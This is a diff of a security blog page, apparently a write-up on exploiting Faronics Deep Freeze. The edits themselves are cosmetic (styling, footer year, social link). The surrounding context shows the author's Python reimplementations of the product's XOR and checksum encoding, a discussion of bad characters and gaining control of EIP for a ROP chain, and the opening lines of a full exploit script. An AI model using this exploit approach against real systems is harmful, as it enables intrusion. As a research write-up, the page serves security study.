@@ -140,7 +140,7 @@
 <p>Some math is then done in &ldquo;generate_xor_one_key_actual_math&rdquo; to kick off the key generation process for the first XOR:</p>
 <p><img src="/images/faronics-deep-freeze/faronics_ida7.jpg" alt="Faronics IDA in generate_xor_one_key_actual_math"></p>
 <p>These are the helper functions that I have used to make life a little easier:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">truncate</span>(num): 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">truncate</span>(num): 
 </span></span><span style="display:flex;"><span>    num <span style="color:#f92672">=</span> num <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> num
 </span></span><span style="display:flex;"><span>
@@ -154,7 +154,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bit_not</span>(n, numbits<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>):
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> numbits) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> n
 </span></span></code></pre></div><p>I have translated the logic into python to make it easier to understand:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_key_xor1</span>(num):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_key_xor1</span>(num):
 </span></span><span style="display:flex;"><span>    key_arr <span style="color:#f92672">=</span> [] 
 </span></span><span style="display:flex;"><span>    printable <span style="color:#f92672">=</span> []
 </span></span><span style="display:flex;"><span>    seed <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0c6e3d57</span> <span style="color:#75715e">## for meowmeow as the customization code</span>
@@ -178,7 +178,7 @@
 <p>Returning back to &ldquo;do_xor_part_one&rdquo; at 0x0046F220, another function &ldquo;generate_xor_one_key_actual_math_2&rdquo; at 0x004B051C is then called to generate the values of the XOR key. Note that after &ldquo;generate_xor_one_key_actual_math_2&rdquo; is done, there is an additional <code>and eax, 0x800000FF</code> step in &ldquo;do_xor_part_one&rdquo;. The line <code>xor [ecx+eax], dl</code> then performs the actual XOR operation.</p>
 <p><img src="/images/faronics-deep-freeze/faronics_ida9.jpg" alt="Faronics IDA in generate_xor_one_key_actual_math_2"></p>
 <p>I have also implemented this in python (hopefully this is readable; this is spaghetti code whoops) &ndash; continuing from the code above:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>: 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>: 
 </span></span><span style="display:flex;"><span>            part2 <span style="color:#f92672">=</span> value2 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x4e35</span>
 </span></span><span style="display:flex;"><span>            part1 <span style="color:#f92672">=</span> seed <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x15a</span>
 </span></span><span style="display:flex;"><span>            addition <span style="color:#f92672">=</span> truncate(truncate(part1) <span style="color:#f92672">+</span> truncate(part2))
@@ -201,7 +201,7 @@
 <p>The function &ldquo;generate_xor_two_key&rdquo; at 0x0046F150 can be seen here:</p>
 <p><img src="/images/faronics-deep-freeze/faronics_ida11.jpg" alt="Faronics IDA in generate_xor_two_key"></p>
 <p>I have also converted this XOR encoding scheme into a python function to generate the key array:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_key_xor2</span>(num, header):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_key_xor2</span>(num, header):
 </span></span><span style="display:flex;"><span>    key_arr <span style="color:#f92672">=</span> [] 
 </span></span><span style="display:flex;"><span>    printable <span style="color:#f92672">=</span> []
 </span></span><span style="display:flex;"><span>    ax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
@@ -259,7 +259,7 @@ Opcode: 0x1f6
 <p>&ldquo;do_encode_three_checksum&rdquo; will calculate a checksum based on all the data starting from byte 0x14 onwards.</p>
 <p><img src="/images/faronics-deep-freeze/faronics_ida14.jpg" alt="Faronics IDA in do_encode_three_checksum"></p>
 <p>I have translated the asm code logic into python:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode_three</span>(msg, count):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode_three</span>(msg, count):
 </span></span><span style="display:flex;"><span>    buffer <span style="color:#f92672">=</span> msg 
 </span></span><span style="display:flex;"><span>    variable <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e">## edx</span>
 </span></span><span style="display:flex;"><span>    eax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
@@ -308,7 +308,7 @@ data += p32(0x0135faf0) ## Valid pointer for edx
 <p>Note that in this case, \x00 is not a bad character on its own, but \x00\x00 is a bad character. This is likely due to wchar being used, and \x00\x00 would equate to a &ldquo;wchar null byte&rdquo;.</p>
 <p>Now that we control EIP, we can create the VirtualAlloc skeleton and build our ROP chain and finally get a shell!</p>
 <p>The full exploit is here:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/python3</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
@@ -632,7 +632,7 @@ data += p32(0x0135faf0) ## Valid pointer for edx
 
     Kaligula Armblessed
 
-<span id="thisyear">2025</span>
+<span id="thisyear">2026</span>
 
 
         | Built on <a href="//gohugo.io" target="_blank">Hugo</a>
@@ -640,7 +640,7 @@ data += p32(0x0135faf0) ## Valid pointer for edx
 </p>
     <p class="text-center">
         
-        <a href="https://twitter.com/KaligulaSec">Twitter</a> 
+        <a href="https://x.com/KaligulaSec">Twitter</a> 
         
         <a href="https://github.com/KaligulaArmblessed">GitHub</a> 
         
